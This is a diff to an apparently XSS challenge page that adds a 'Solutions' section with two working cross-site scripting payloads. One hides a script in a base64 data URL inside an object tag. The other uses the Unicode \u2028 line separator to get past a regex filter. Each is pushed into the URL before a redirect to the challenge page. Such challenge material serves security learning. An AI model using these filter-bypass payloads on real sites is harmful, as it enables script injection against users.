@@ -17,5 +17,20 @@ if(!/(on.*$)/i.test(jja)){
 document.write(jja);
 
 }}}}}
-
+ 
 </script>
+
+<h3>Solutions:</h3>
+<ul><li>Using object with pseudo base64 url: <button onclick="s1();">GO</button></li>
+  <li>Bypassing the regex using unicode \u2028 and \u2029 will make a new line, By (ohanarray) <button onclick="s2();">GO</button></li></ul>
+  
+  <script>
+    function s1(){
+    history.pushState(null,null,"?<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4='>");
+setTimeout("window.location=('https://renwax23.github.io/X/xs.html');", 1000);}
+    
+    function s2(){
+    history.pushState(null,null,"?<script>alert(\"XSS\")<\/script>\u2028");
+setTimeout("window.location=('https://renwax23.github.io/X/xs.html');", 1000);}
+
+</script> 
